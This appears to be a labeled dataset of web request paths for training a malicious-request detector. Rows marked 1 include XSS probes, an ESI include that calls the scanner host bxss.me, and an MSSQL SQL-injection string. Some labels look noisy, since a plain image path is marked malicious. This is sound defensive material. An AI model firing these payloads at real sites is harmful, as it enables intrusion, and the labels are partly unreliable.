request	label
/****/jtdt/2020_jtyw/202012/t20201201_264215.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(1019)"">?_=1630311691868"	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\u0433\ufffd\ufffd\ufffd\u03f4\ufffd\u063b\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/*****/system/2020/10/14/javascript:window.print()	1
"/***/2019<esi:include src=""""http://bxss.me/rpb.png""""/>/11/15/art_390_182836.html"	1
/*****/system/2011/11/28/010551281_01.shtml	0
/****/gjdjbn/djbn_zyjh/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/0/01/95/50/1955003_775334.jpg	0
/****/\ufffd\u00b5\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u558a\u53eb\u6c34\u4e61\u5468\u7389\u6c5f\u7852\u7802\u74dc\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/tskmh/201903/ywly/gccb/xwzx/jtdt/rssdy/wzdt/qtyz/	0
/***/400/11/05/19/11051960_918118.jpg	1
/****/20210901/10399.html	0
"/****/openemr/?site="""">alert(777);"	1
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u96d5\u9f99\u753b\u6846\u7cbe\u7f8e\u88c5\u9970\u90e8	0
"/**/products/heavymachinery/201505/"""""	0
/*****/newspic/newspic010g/img_2348.jpg	0
"/******/web/messagebook/script/messagebook.js/<img src=""javascript:alert(5752)"">"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7fcc\u5f95\u987a\u4e94\u91d1\u673a\u7535\u7ecf\u9500\u90e8	0
/**/system/2019/10/16/011848601.shtml	0
/****/gjzqq/oz/bels/201412/w020141212417683818087.gif	0
/****/czgk/bmjs/qtdw/zzqzfgjjglb/202108/t20210812_2972651.html	0
/****/bmkx/sfgw/201901/w020190104597312585589.png	0
/****/b-e348629.html	0
/**********/system/2021/12/08/013491603.shtml	0
/****/	1
/****/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
/***/blockdata/getsearchinfo.do?&title=\u53cd\u72b9\u4e3b\u4e49	0
"/**/index.php?action=list&order=nan""/><script>alert(777);</script>me&srt=yes"	1
/******/visitcount/visit.jsp?i_columnid[1]==1'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1080447799')))>'0&i_columnid[0]=exp&i_webid=1&type=1	1
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/202007/t20200701_168701.html	0
/************/action/document/init/1472779430161043456-1472779430177820672-595?senior=undefined&_=1639972956085	0
/****/201806/t20180620_188343.html	0
/****/20210306/e117653062.html	0
/**********/system/2021/10/04/javascript:window.close();	1
/**********/system/2020/09/28/013256212.shtml	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(3668)</script>?_=1630311999630"	1
/*******/6801vd8.php	1
/****/bmkx/skjj/201610/t20161025_12104_wap.html	0
/**/viewspace-322.html	0
/**********/system/2020/05/04/013154233.shtml	0
/****/bmkx/sfgw/201610/t20161025_14207.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8fce\u6c34\u9547\u4f55\u6ce2\u670d\u88c5\u5e97	0
/*****/javascript/bootstrap/fonts/glyphicons-halflings-regular.woff	0
/****/bmkx/sjsj/201704/t20170420_89106.html	0
/****/category/silutouzi?page=1</script><script>z9xk(9673)</script>	1
/zwxx_11337/****/202111/t20211110_3121992.html/index_1.html	0
